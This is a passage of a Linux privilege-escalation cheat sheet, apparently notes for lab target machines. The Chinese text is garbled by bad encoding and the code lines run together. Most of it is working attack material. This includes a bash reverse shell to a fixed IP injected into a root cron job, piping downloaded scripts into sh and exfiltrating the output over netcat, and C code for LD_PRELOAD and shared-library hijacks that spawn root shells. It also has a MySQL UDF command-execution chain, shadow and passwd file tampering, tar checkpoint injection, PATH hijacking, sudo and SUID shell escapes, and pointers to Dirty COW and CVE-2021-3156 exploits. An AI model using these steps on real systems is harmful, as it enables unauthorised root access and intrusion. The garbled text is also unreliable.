å¯ä»¥çŸ¥é“å“ªä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨ç‰¹å®šçš„ç½‘ç»œè¿æ¥ã€‚\n**-s**ï¼šæ˜¾ç¤ºæ¯ä¸ªç½‘ç»œåè®®çš„ç»Ÿè®¡ä¿¡æ¯ã€‚è¾“å‡ºåŒ…æ‹¬å„ç§åè®®çš„å‘é€å’Œæ¥æ”¶æ•°æ®åŒ…ã€å‡ºé”™ä¿¡æ¯ã€ä¸¢åŒ…æƒ…å†µç­‰\n\n6.æŸ¥çœ‹ç¯å¢ƒå˜é‡12echo $PATHenv\n\n7.æŸ¥çœ‹å®šæ—¶ä»»åŠ¡1cat /etc/crontab\n\nè‡ªåŠ¨åŒ–æšä¸¾\nLinpeas\nLinenum\nlinux-smart-enumeration\nlinux-exploit-suggester\nlinuxprivchecker\nunix-privesc-check\n\n12curl -L https://github.com/carlospolop/PEASS-ng/reeleases/download/20230425-bd7331ea/linpeas.shsh #Linpeasæ–‡ä»¶ä¸è½åœ°æ‰«æ\n\nå¦‚æœé¶æœºä¸è”ç½‘1234python -m http.server 80 #kaliwget http://xx/xx.sh | sh |nc kaliçš„ip 8888 #é¶æœºsudo nc -lvnp 8888 | tee linpeas.txt  #kaliless -r linpeas.txt \n\n\nåœ¨ Kali Linux ä¸Šï¼Œä½ å¯åŠ¨äº†ä¸€ä¸ª HTTP æœåŠ¡å™¨ï¼Œèƒ½å¤Ÿæä¾› xx.sh è„šæœ¬çš„ä¸‹è½½ã€‚\né¶æœº é€šè¿‡ wget ä¸‹è½½å¹¶æ‰§è¡Œè¯¥è„šæœ¬ã€‚æ‰§è¡Œçš„è¾“å‡ºé€šè¿‡ netcat å‘é€å› Kali Linuxã€‚\nKali Linux ä¸Šçš„ netcat ç›‘å¬å™¨æ¥æ”¶è¾“å‡ºï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°æ–‡ä»¶ä¸­\n\nä¸ä½¿ç”¨curl wget\n12cat &lt; /dev/tcp/10.10.10.10/80 |sh #é¶æœºsudo nc -lvnp 80 &lt; linpeas.sh #kali \n\nlinuxå¸¸ç”¨æŒ‡ä»¤\n\nMy sql UDFUDF :user defined function123456789searchploit UDFcat 1518.cgcc -g -c raptor_udf2.cgcc -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcmysql -u xxxx -p\n\nå‰ææ¡ä»¶secure_file_privä¸ºç©º ps:ä¸ºnullä¸è¡Œ\næˆ–è€…æ˜¯æŒ‡å®šç›®å½•ä¸ºç›®æ ‡ç›®å½•\n1234567891011121314151617show variables like &#x27;%secure_file_priv%&#x27;ï¼›show variables like &#x27;%plugin%&#x27;;use mysql;create table foo(line blob);insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2so&#x27;));select *from foo into dumpfile &#x27;/usr/lib/raptor_udIf2.so&#x27;;create function do_system returns integer soname_&#x27;raptor_udf2.so&#x27;;select * from mysql.func; #åˆ°æ­¤è‡ªå®šä¹‰å‡½æ•°æˆåŠŸ#å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°è®²/bin/bashå¤åˆ¶åˆ°/tmpç›®å½•ä¸‹select do_system(&#x27;cp /bin/bash /tmp/rootbash; chmod 777 /tmp/rootbash&#x27;);\n\n123#é€€å‡ºæ•°æ®åº“cd /tmprootbash -p\n\nshadowæ–‡ä»¶åˆ©ç”¨ææƒå¯è¯»12cat /etc/shadow #å¦‚æœå¯è¯»cat /etc/shadow |grep &#x27;:\\$&#x27; &gt;1.txt\n\nå°†æœ‰hashçš„ç”¨æˆ·æå–å‡ºæ¥ï¼Œå¹¶å¯¹hashå¯†æ–‡è¿›è¡Œçˆ†ç ´\n**$6$**æ˜¯SHA-512åŠ å¯†çš„\n1sudo john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt\n\nè·å¾—æ˜æ–‡å¯†ç è¿›è¡Œç™»å½•\nå¯å†™1234cp /etc/shadow /tmp/shadow.bak #è¿›è¡Œå¤‡ä»½#å°†å¯†ç æ›¿æ¢æˆæˆ‘ä»¬è‡ªå·±çš„mkpasswd -m sha-512 Sygsdsg #-m æŒ‡å®šåŠ å¯†æ¨¡å¼ å°†ç”Ÿæˆçš„å¯†æ–‡è¿›è¡Œæ›¿æ¢#å†’å·ä¹‹é—´è¿›è¡Œæ›¿æ¢\n\nshadowæ–‡ä»¶ç”Ÿæˆå¯†ç ä½¿ç”¨mkpasswd\nå¯å†™passwdæ–‡ä»¶åˆ©ç”¨ææƒ1234ls -liah /etc/passwd #æŸ¥çœ‹æƒé™cp /etc/passwd /tmp/passwd.bak #å¤‡ä»½openssl passwd Sygsdsg #å°†ç”Ÿæˆçš„å¯†æ–‡è¿›è¡Œæ›¿æ¢xip #ç¡®å®šé¶æœº\n\npasswdsç”Ÿæˆå¯†ç ä½¿ç”¨çš„æ˜¯openssl\nsudoç¯å¢ƒå˜é‡ææƒ ï¼ˆsudo -lï¼‰123sudo -l#å‰æenv_keep+=LD_PRELOAD å¯ä»¥åŠ è½½åŠ¨æ€å…±äº«åº“vim shell.c\n\n1234567891011#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void init() &#123;    unsetenv(&quot;LD_PRELOAD&quot;); // Remove any LD_PRELOAD environment variable.    setgid(0);               // Set the group ID to root (0).    setuid(0);               // Set the user ID to root (0).    system(&quot;/bin/bash&quot;);     // Execute a bash shell.&#125;\n\n1gcc -fPIC -shared -o shell.so shell.c -nostartfiles #ç¼–è¯‘æ–‡ä»¶\n\n\ngcc: GNU C ç¼–è¯‘å™¨çš„å‘½ä»¤ã€‚\n-fPIC: ç”Ÿæˆä½ç½®æ— å…³ä»£ç ï¼ˆPosition Independent Codeï¼‰ï¼Œè¿™æ˜¯åˆ›å»ºå…±äº«åº“çš„å¿…è¦é€‰é¡¹ã€‚\n-shared: æŒ‡ç¤ºç¼–è¯‘å™¨ç”Ÿæˆå…±äº«åº“ï¼Œè€Œä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ã€‚\n-o shell.so: æŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„åç§°ä¸º shell.soã€‚\nshell.c: è¾“å…¥çš„ C æºæ–‡ä»¶ã€‚\n-nostartfiles: ä¸é“¾æ¥æ ‡å‡†å¯åŠ¨æ–‡ä»¶ã€‚è¿™åœ¨ç¼–è¯‘å…±äº«åº“æ—¶å¯èƒ½ä¼šç”¨åˆ°ï¼Œå°¤å…¶æ˜¯å½“ä½ ä¸éœ€è¦æ ‡å‡†çš„ C åº“åˆå§‹åŒ–æ—¶ã€‚\n\nä¼šç¼–è¯‘å‡ºä¸€ä¸ª shell.soæ–‡ä»¶ï¼Œåˆ°æ­¤ï¼Œææƒçš„è„šæœ¬å‡†å¤‡å®Œæ¯•ï¼Œç°åœ¨éœ€è¦ä½¿ç”¨ä¸€ä¸ªé«˜æƒé™ç”¨æˆ·çš„ä»»æ„ä¸€ä¸ªå‘½ä»¤æ¥ä¸€ä¸ªæ‰§è¡Œè„šæœ¬ï¼Œå¯ä»¥çŸ¥é“ï¼Œsudo -l æœ‰æ—¶è¿˜ä¼šæ˜¾ç¤ºå¦‚ä¸‹å›¾\n\n12sudo LD_PRELOAD=/home/user/shell.so find#é€šè¿‡ä½¿ç”¨rootçš„findå‘½ä»¤ï¼Œåœ¨å‘½ä»¤æ‰§è¡Œä¹‹å‰é¢„å…ˆåŠ è½½æˆ‘ä»¬è„šæœ¬ä¸­çš„åº“\n\ncrontabæ–‡ä»¶æƒé™ææƒä¿®æ”¹æ–‡ä»¶å†…å®¹12cat /etc/crontablocate xx.sh #æŸ¥çœ‹ç›®æ ‡å®šæ—¶ä»»åŠ¡è·¯å¾„\n\næŸ¥çœ‹æ˜¯å¦æœ‰é«˜æƒé™ç”¨æˆ·ç•™ä¸‹å®šæ—¶ä»»åŠ¡ï¼Œå†æŸ¥çœ‹å®šæ—¶ä»»åŠ¡æœ‰æ²¡æœ‰å¯å†™æƒé™ï¼Œå¦‚æœæ»¡è¶³ï¼Œç›´æ¥å†™å…¥åå¼¹shellçš„å‘½ä»¤\n12echo &quot;bash -i &gt;&amp;/dev/tcp/192.168.38.130/8888 0&gt;&amp;1&quot; &gt;&gt; xx.sh #xx.shæ˜¯ç›®æ ‡å®šæ—¶ä»»åŠ¡ é¶æœºrlwrap nc -lvnp 8888#kali\n\nç­‰å¾…åå¼¹shell\nä¿®æ”¹æ–‡ä»¶è·¯å¾„å‰æï¼ŒæŒ‡å®šå®šæ—¶ä»»åŠ¡æ—¶ä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œå¦‚ç¬¬ä¸€æ¡\n12* * * * * root overwrite.sh* * * * * root /usr/local/bin/compress.sh\n\n12345cat /etc/crontab #ä¼šçœ‹åˆ°æŒ‡å®šçš„è·¯å¾„PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin #locate overwrite.sh\n\nè‹¥ä¸ºæŒ‡å®šè·¯å¾„ï¼Œåœ¨æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ—¶ï¼Œä¼šé€šè¿‡PATHé å‰çš„è·¯å¾„å¯»æ‰¾æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥çœ‹è§ç¬¬ä¸€ä¸ªè·¯å¾„æ˜¯**&#x2F;home&#x2F;user**\n12cd /home/uservi overwrite.sh #å†…å®¹å¦‚ä¸‹\n\n123#!/bin/bashcp /bin/bash /tmp/rootbash chmod +xs /tmp/rootbash\n\n12chmod +x overwrite.sh #ç­‰å¾…å®šæ—¶ä»»åŠ¡è®¾å®šæ—¶é—´/tmp/rootbash -p\n\nè‡ªåŠ¨ä»»åŠ¡tar çš„ checkpoint123456789cat  /etc/crontab#çœ‹åˆ°è¿™ä¸ª* * * * * root /usr/local/bin/compress.shcat /usr/local/bin/compress.sh æ˜¾ç¤º#!/bin/bash cd /home/user #å®šæ—¶ä»»åŠ¡æ˜¯è¿™ä¸ªç›®å½•æ‰§è¡Œå‘½ä»¤tar czf /tmp/backup.tar.gz #è¿›è¡Œå¤‡ä»½å‹ç¼©æ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ç§å¾ˆå¸¸è§„çš„æœåŠ¡å™¨é…ç½®å‘½ä»¤ï¼Œè¿™é‡Œä½¿ç”¨çš„tarä¸­æœ‰checkpointtar --help #å¯ä»¥çœ‹åˆ°checkpoint--checkpoint-action=ACTION execute ACTION on each checkpoint #é€‰é¡¹ä½¿ç”¨æˆ·å¯ä»¥å®šä¹‰åœ¨è¿›ç¨‹è¾¾åˆ°æ£€æŸ¥ç‚¹æ—¶åº”è¯¥æ‰§è¡Œçš„æ“ä½œ\n\nå¯ä»¥çŸ¥é“æˆ‘ä»¬è¿›å…¥ç›®æ ‡ç›®å½•æ‰‹åŠ¨æ·»åŠ æ£€æŸ¥ç‚¹æ¥æ‰§è¡Œè„šæœ¬\n123cd /home/user touch /home/user/--checkpoint=1touch /home/user/--checkpoint-action=exec=shell.sh\n\nshell.shå¯çœ‹ä¸Šæ–‡çš„shellè„šæœ¬\nç­‰å¾…å®šæ—¶ä»»åŠ¡è¿›è¡Œ\nSUIDææƒå¯åˆ©ç”¨è„šæœ¬è¿›è¡Œææƒ123find / -user root -perm -4000 -print 2&gt;/dev/nullfind/-perm-u=s -type f 2&gt;/dev/nullfind/-userroot-perm-4000-exec ls - 1s -1db &#123;&#125; \\;\n\nhttps://www.freebuf.com/vuls/262592.html\nhttps://www.cnblogs.com/liang-chen/p/14367408.html\n\næ‰¾æŸ¥ä»€ä¹ˆæ–‡ä»¶ä¸é‡è¦ï¼ˆä½†æ˜¯æ˜¯å­˜åœ¨çš„æ–‡ä»¶),åªéœ€è¦æ ¼å¼å¯¹ï¼Œç„¶ååé¢åŠ ä¸Š\nfindeg:\n1find / -name index.php -exec &quot;/bin/sh&quot; \\;\n\neximæœ¬æœºç»™åå¼¹shellä¼ è„šæœ¬&#96;\n1234567891011/usr/sbin/exim4 --version #æŸ¥çœ‹ç‰ˆæœ¬searchsploit exim 4#ä¸‹è½½ææƒè„šæœ¬#ä¼ è¾“ææƒè„šæœ¬åœ¨/tmpç›®å½•ä¸‹php -S localhost:8000python -m http.server 8000#å¼€å¯ç½‘ç«™ä¹‹åï¼Œåœ¨é¶æœºshellä¸­è·å–wget -O myfile.txt http://example.com/file.txtcurl http://example.com/file.txt -o myfile.txtæ‰§è¡Œè„šæœ¬chmod 777 xxx.sh\n\nå…±äº«åº“æ³¨å…¥ææƒ123find/-perm-u=s -type f 2&gt;/dev/null #æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶#/usr/localbin/suid-so #åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶\n\nå…ˆæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶\n123456strings /usr/localbin/suid-so #è°ƒè¯•å’Œåˆ†æå…±äº«åº“strace /usr/localbin/suid-so 2&gt;&amp;1 # è¿½è¸ªä¸”è¾“å‡ºé”™è¯¯ä¿¡æ¯strace /usr/localbin/suid-so 2&gt;&amp;1 | grep &#x27;/home&#x27; # ä»…æ˜¾ç¤ºhomeçš„æœ‰å…³ä¿¡æ¯#æŠ¥å‡ºopen(&quot;/home/user/.config/libcalc.so&quot;, O_FRDONLY) = -1 ENOENT (No such file or directory)#è¿™æ„å‘³ç€ç³»ç»Ÿå°è¯•æ‰“å¼€æŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶ libcalc.so ä½†å¤±è´¥äº†\n\nè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è‡ªå·±ç¼–è¾‘libcalc.soï¼Œç›´æ¥ç¼–è¾‘æˆæˆ‘ä»¬çš„ææƒè„šæœ¬\n123mkdir .config # æ–°å»ºæ–‡ä»¶å¤¹cd .config # åˆ‡æ¢åˆ°.configç›®å½•ä¸‹vim libcalc.c # å› ä¸ºç›®æ ‡æ–‡ä»¶æ˜¯å…±äº«åº“ï¼Œæ•…éœ€è¦å…ˆå†™ä»£ç ï¼Œå†ç¼–è¯‘æˆå…±äº«åº“æ–‡ä»¶ \n\n123456789101112131415//libcalc.cå†…å®¹#include &lt;stdio.h&gt; //æ ‡å‡†è¾“å…¥è¾“å‡ºåº“#include &lt;stdlib.h&gt; //Cè¯­è¨€æ ‡å‡†åº“#include &lt;unistd.h&gt; //åŒ…å«setuidå’Œsetgidçš„åº“//staticè¡¨ç¤ºè¯¥å‡½æ•°ä¸ºé™æ€å‡½æ•°ï¼Œä»…åœ¨å½“å‰æ–‡ä»¶ä¸­å¯è§ï¼›//__attribute__((constructor))ï¼šgccç‰¹æœ‰ï¼Œç”¨äºæŒ‡å®šå‡½æ•°å†ç¨‹åºåŠ è½½æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ã€‚å½“ç¨‹åºå¯åŠ¨æ—¶ï¼Œç¼–è¯‘å™¨ä¼šåœ¨æ‰€æœ‰æ™®é€šçš„å…¨å±€å’Œé™æ€å˜é‡åˆå§‹åŒ–ä¹‹åï¼Œå†mainå‡½æ•°æ‰§è¡Œä¹‹å‰è°ƒç”¨è¿™ä¸ªè¢«æ ‡è®°çš„å‡½æ•°ã€‚static void inject() __attribute__((constructor));void inject()&#123;\tsetgid(0);\tsetuid(0);\tsystem(&quot;/bin/bash -p&quot;); //-p:ä»¥rootèº«ä»½å¯åŠ¨shell&#125;\n\n12gcc -shared -fPIC -o libcalc.so libcalc.c # ç¼–è¯‘usr/local/bin/suid-so #å†æ¬¡æ‰§è¡Œæ—¶ï¼Œå³å¯ææƒæˆåŠŸ\n\nç¯å¢ƒå˜é‡åˆ©ç”¨ææƒ1find/-perm-u=s -type f 2&gt;/dev/null\n\nè¿™é‡Œå…³æ³¨/usr/localbin/suid-envæ–‡ä»¶ï¼Œæ‰§è¡Œç¨‹åºï¼Œå¹¶ç”¨stringsæŸ¥çœ‹ç¨‹åºä¸­å‡ºç°çš„å¯æ‰“å°å­—ç¬¦\n1strings /usr/localbin/suid-env \n\n#çœ‹åˆ°\n\nè¿™é‡Œç”¨serviceå‘½ä»¤å¯åŠ¨apacheæœåŠ¡ï¼Œservice apache2 startã€‚å› ä¸ºè¿™é‡Œçš„serviceç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œè€Œç›¸å¯¹è·¯å¾„å°±ä¸ç¯å¢ƒå˜é‡ä¸­çš„PATHæœ‰å…³ï¼Œå½“è¯•å›¾å¯åŠ¨apacheæœåŠ¡æ—¶ï¼Œç³»ç»Ÿä¼šå»PATHé‡Œï¼ŒæŒ‰ç…§è·¯å¾„çš„å…ˆåé¡ºåºä¾æ­¤å¯»æ‰¾serviceè„šæœ¬ã€‚è¿™é‡Œå°±å¯ä»¥é€šè¿‡æ›´æ”¹ç¯å¢ƒå˜é‡ä¸­çš„PATHå®ç°ææƒã€‚\n1vim service.c\n\n123456789#include &lt;stdio.h&gt; //æ ‡å‡†è¾“å…¥è¾“å‡ºåº“#include &lt;stdlib.h&gt; //Cè¯­è¨€æ ‡å‡†åº“#include &lt;unistd.h&gt; //åŒ…å«setuidå’Œsetgidçš„åº“void main()&#123;\tsetgid(0);\tsetuid(0);\tsystem(&quot;/bin/bash -p&quot;); //-p:ä»¥rootèº«ä»½å¯åŠ¨shell&#125;\n\n1gcc -o service service.c\n\n123echo $PATH # æŸ¥çœ‹å½“å‰$PATHå˜é‡export PATH=.:$PATH # å°†å½“å‰è·¯å¾„åŠ å…¥åˆ°$PATHä¸­/usr/localbin/suid-env #å†æ¬¡æ‰§è¡Œï¼Œè¿›è¡Œææƒ\n\n\n\nå·§ç”¨SUID-shellåŠŸèƒ½ææƒ#1å·§ç”¨SUID-shellåŠŸèƒ½ææƒ#2å¯†ç å’Œå¯†é’¥å†å²æ–‡ä»¶ææƒå¯†ç å’Œå¯†é’¥é…ç½®æ–‡ä»¶æŸ¥çœ‹ææƒSSHå¯†é’¥æ•æ„Ÿä¿¡æ¯ææƒNFSææƒå†…æ ¸åˆ©ç”¨ææƒdoas less+viææƒåˆ©ç”¨MOTDæœºåˆ¶ææƒå¯é¢„æµ‹PRNGæš´åŠ›ç ´è§£SSHææƒå†…æ ¸æ¼æ´ææƒæŸ¥çœ‹å‘è¡Œç‰ˆæœ¬\n123cat /etc/issue cat/etc/*-releaseuname-a\n\nè¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬å¯ä»¥ç”¨kaliè‡ªå¸¦çš„searchsploitæ¥æœç´¢exploitdbä¸­çš„æ¼æ´åˆ©ç”¨ä»£ç ,ä¹Ÿå¯ä»¥ç›´æ¥å»ç½‘ä¸Šæœç´¢\nsearchsploit linux Debian æŸ¥çœ‹å†…æ ¸æ¼æ´poc\nsearchsploit -p 19256 æŸ¥çœ‹æ¼æ´pocç›¸å…³å†…å®¹  or  githubæœç´¢ææƒ\nè„ç‰›ææƒ1.å…ˆåœ¨&#x2F;tmpç›®å½•ä¸Šä¼ (rz)è„ç‰›æ–‡ä»¶ï¼Œ ps:&#x2F;tmpä»»æ„ç”¨æˆ·éƒ½æœ‰æ“ä½œæƒé™\n2.ç¼–è¯‘è„ç‰›æ–‡ä»¶ gcc -pthread dirty.c -o dirty -lcrypt\n\n3.æ‰§è¡Œæ–‡ä»¶   ./dirty   \nsudoææƒ2021å¹´1æœˆ26æ—¥,Sudoå‘å¸ƒå®‰å…¨é€šå‘Š,ä¿®å¤äº†ä¸€ä¸ªç±»Unixæ“ä½œç³»ç³»ç»Ÿåœ¨å‘½ä»¤å‚æ•°ä¸­è½¬ä¹‰åæ–œæ æ—¶å­˜åœ¨åŸºäºå †çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚å½“sudoé€šè¿‡-sæˆ–-iå‘½ä»¤è¡Œé€‰é¡¹åœ¨shellæ¨¡å¼ä¸‹è¿è¡Œå‘½ä»¤æ—¶,å®ƒå°†åœ¨å‘½ä»¤å‚æ•°ä¸­ä½¿ç”¨åæ–œæ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚ä½†ä½¿ç”¨-sæˆ–-iæ ‡å¿—è¿è¡Œsudoeditæ—¶,å®é™…ä¸Šå¹¶æœªè¿›è¡Œè½¬ä¹‰,ä»è€Œå¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚å› æ­¤åªè¦å­˜åœ¨sudoersæ–‡ä»¶(é€šå¸¸æ˜¯&#x2F;etc&#x2F;sudoers),æ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨æœ¬åœ°æ™®é€šç”¨æˆ·åˆ©ç”¨sudoè·å¾—ç³»ç»Ÿrootæƒé™ã€‚ç›®å‰æ¼æ´ç»†èŠ‚å·²å…¬å¼€,è¯·å—å½±å“çš„ç”¨æˆ·å°½å¿«é‡‡å–æªæ–½è¿›è¡Œé˜²æŠ¤ã€‚ç›¸å…³æ–‡ç« :Linuxä¸­suå’Œsudoçš„ç”¨æ³•å’ŒåŒºåˆ«https://xie1997.blog.csdn.net/article/details/99710793\n1234æ¼æ´å½±å“ç‰ˆæœ¬Sudo 1.8.2 - 1.8.31p2Sudo 1.9.0 - 1.9.5p1ä¸å—å½±å“ç‰ˆæœ¬:sudo=&gt;1.9.5p2\n\nsudo --version æŸ¥çœ‹sudoç‰ˆæœ¬\nsudo -l``sudo -l å‘½ä»¤ç”¨äºåˆ—å‡ºå½“å‰ç”¨æˆ·å¯ä»¥æ‰§è¡Œçš„ sudo å‘½ä»¤å’Œç›¸å…³æƒé™\næ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´,ä½¿ç”¨æ™®é€šç”¨æˆ·æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤sudoedit -s /\nè‹¥è¿”å›å¦‚å›¾ä»¥â€sudoedit:â€å¼€å¤´çš„é”™è¯¯,åˆ™å½“å‰ç³»ç»Ÿå¯èƒ½å­˜åœ¨å®‰å…¨é£é™©ä¸å—å½±å“çš„ç³»ç»Ÿå°†æ˜¾ç¤ºä»¥â€usage:â€å¼€å¤´çš„é”™è¯¯\npocä¸‹è½½åœ°å€ https://github.com/blasty/CVE-2021-3156\nè¿›å…¥ä¸‹è½½ç›®å½• makeç¼–è¯‘å®‰è£…\ngitææƒ12345sudo git help config\t!/bin/bashæˆ–è€…ï¼&#x27;sh&#x27;å®Œæˆææƒ sudo git  -p help\t!/bin/bash\n\n\n-exec â€œ&#x2F;bin&#x2F;shâ€ ; \nrbashå¦‚ä½•è®¾ç½®rbash12useradd -s /bin/rbash test # è®¾ç½®ç”¨æˆ·testç™»é™†çš„shellä¸ºrbashmkdir -p /home/test/.bin # åœ¨testç”¨æˆ·ä¸‹æ–°å»ºä¸€ä¸ª.binç›®å½•å­˜æ”¾å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤\n\nä¼šé™åˆ¶ä¸€äº›è¡Œä¸ºï¼Œè®©ä¸€äº›å‘½ä»¤æ— æ³•æ‰§è¡Œ\nrbashé€ƒé€¸åšä¿¡æ¯æ”¶é›†æšä¸¾ç¯å¢ƒå˜é‡\næŸ¥çœ‹å½“å‰çš„ç¯å¢ƒå˜é‡è®¾ç½®ã€‚ç‰¹åˆ«æ˜¯**PATHå’ŒSHELLå˜é‡**ï¼Œå®ƒä»¬å¯èƒ½å½±å“åˆ°å‘½ä»¤çš„æŸ¥æ‰¾å’Œæ‰§è¡Œ\n123456declare -xtypeset -xexportenvprintenvecho $PATH\n\næ£€æŸ¥å…³äºrbashé€ƒé€¸å¯ç”¨åº”ç”¨å’ŒæœåŠ¡æ–‡æœ¬ç¼–è¾‘å™¨ï¼šå¦‚viã€vimã€nanoç­‰ï¼Œè¿™äº›ç¼–è¾‘å™¨æœ‰æ—¶å€™å…è®¸ç”¨æˆ·æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\nå…¶ä»–ç³»ç»Ÿå·¥å…·ï¼šå¦‚ftpï¼Œmoreï¼Œlessï¼Œmanç­‰ï¼Œè¿™äº›å·¥å…·åœ¨ç‰¹å®šæƒ…å†µä¸‹ä¹Ÿå¯ç”¨äºæ‰§è¡Œå‘½ä»¤é€ƒé€¸\nè°ƒè¯•å·¥å…·ï¼šå¦‚gdbï¼Œåœ¨æŸäº›é…ç½®ä¸‹å¯èƒ½å…è®¸ç”¨æˆ·æ‰§è¡Œä»»æ„ä»£ç \næšä¸¾å¯ç”¨çš„å‘½ä»¤å’Œæ“ä½œç¬¦å‘½ä»¤æšä¸¾ï¼šæ£€æŸ¥å“ªäº›å‘½ä»¤åœ¨rbashç¯å¢ƒä¸­æ˜¯å¯ç”¨çš„ã€‚è¿™é€šå¸¸åŒ…æ‹¬ä¸€äº›åŸºæœ¬çš„æ–‡ä»¶æ“ä½œå‘½ä»¤ï¼ˆå¦‚lsã€catã€echoç­‰ï¼‰ï¼Œä»¥åŠå¯èƒ½æœªè¢«ç¦ç”¨çš„ç³»ç»Ÿå‘½ä»¤ã€‚\næ“ä½œç¬¦æšä¸¾ï¼šå°è¯•ä½¿ç”¨é‡å®šå‘æ“ä½œç¬¦ï¼ˆå¦‚&gt;ã€&gt;&gt;ã€&lt;ç­‰ï¼‰å’Œç®¡é“æ“ä½œç¬¦ï¼ˆ|ï¼‰ï¼Œä»¥è¯„ä¼°å®ƒä»¬æ˜¯å¦å¯ç”¨ã€‚è¿™äº›æ“ä½œç¬¦åœ¨æ„å»ºé€ƒé€¸å‘½ä»¤æ—¶å¯èƒ½éå¸¸æœ‰ç”¨ã€‚\næ£€æŸ¥å¯ç”¨ç¼–ç¨‹è¯­è¨€1python  perl  ruby  php  javaç­‰\n\nç”¨æˆ·å’Œsudoæƒé™\nç”¨æˆ·æƒé™ï¼šäº†è§£å½“å‰ç”¨æˆ·çš„æƒé™èŒƒå›´ï¼ŒåŒ…æ‹¬å¯ä»¥è®¿é—®å“ªäº›æ–‡ä»¶å’Œç›®å½•ã€‚\nsudoæƒé™ï¼šä½¿ç”¨sudo -lå‘½ä»¤æŸ¥çœ‹å½“å‰ç”¨æˆ·æ˜¯å¦æœ‰sudoæƒé™ä»¥åŠå¯ä»¥æ‰§è¡Œå“ªäº›å‘½ä»¤ã€‚è¿™æœ‰åŠ©äºè¯„ä¼°æ˜¯å¦å¯ä»¥é€šè¿‡sudoå‘½ä»¤ç»•è¿‡rbashé™åˆ¶ã€‚\n\n1.â€œ&#x2F;â€å­—ç¬¦è¢«å…è®¸äº†txtå¦‚æœ/è¢«å…è®¸æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿è¡Œï¼š/bin/bash2.cpå‘½ä»¤è¢«å…è®¸12345#å¯ä»¥ç›´æ¥å¤åˆ¶/bin/bashåˆ°æœ¬åœ°ç”¨æˆ·ç›®å½•cp /bin/bash test1cp /bin/sh test2./test1 # åˆ‡æ¢åˆ°äº†/bin/bash./test2 # åˆ‡æ¢åˆ°äº†/bin/sh\n\n3.å¸¸è§å·¥å…·æ¢æµ‹ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨å¸¸è§å·¥å…·\nman git12man &gt; !/bin/shgit &gt; git help status\n\nFTPï¼ŒGDB12ftp &gt; !/bin/shgdb &gt; !/bin/sh\n\nvi&#x2F;vim12vim test!/bin/sh # åˆ©ç”¨åœ¨vi/vimä¸­å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ç‰¹ç‚¹\n\ned-editor12ed!&#x27;/bin/sh&#x27;\n\nfind12find / -name SomeName -exec /bin/sh \\;find / -name SomeName -exec /bin/bash \\;\n\nmore&#x2F;less12more test!/bin/sh # åŒæ ·ä¹Ÿæ˜¯åˆ©ç”¨æ‰“å¼€æ–‡ä»¶åå¯ä»¥åœ¨ä¸‹é¢è¿è¡Œå‘½ä»¤çš„ç‰¹\n\n4.set shellåœ¨ä¸€äº›ç¼–è¾‘å™¨ä¸­å¯ä»¥è®¾ç½®shellå˜é‡ç„¶åæ‰§è¡Œï¼Œå¦‚vimä¸­\n123456#vim/viè¿›å…¥ä¹‹åset shell=/bin/sh # æˆ–è€…ç”¨/bin/bashshell#åˆ‡æ¢å®Œæˆä¹‹åè¿˜è¦æ·»åŠ ç¯å¢ƒå˜é‡ã€‚ç»™$PATHå˜é‡å¢åŠ ä¸¤ä¸ªè·¯å¾„ï¼Œç”¨æ¥æŸ¥æ‰¾å‘½ä»¤export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin/\n\n5.æ›´æ”¹PATHæˆ–SHELLç¯å¢ƒå˜é‡1234export -p # æŸ¥çœ‹ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡è®¾ç½® PATH å’Œ SHELL å˜é‡çš„æƒé™è®¾ç½®å¾ˆå¯èƒ½æ˜¯ï¼šâ€œ-rxâ€ ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬åªèƒ½æ‰§è¡Œå’Œè¯»å–ï¼Œä¸èƒ½å†™å…¥ã€‚å¦‚æœæœ‰wæƒé™çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç»™å®ƒå†™å…¥export PATH=$PATH:/bin/:/usr/bin:$PATHexport SHELL=/bin/sh\n\n6.ç¼–ç¨‹è¯­è¨€è¯­è¨€å¯ä»¥å¸®åŠ©æˆ‘ä»¬åˆ‡æ¢shellçš„ç±»å‹\n(1) python12python -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;\n\n(2) php1php -a then exec(&quot;sh -i&quot;)\n\n(3) perl1perl -e &quot;exec &#x27;/bin/sh&#x27;;&quot;\n\n(4) 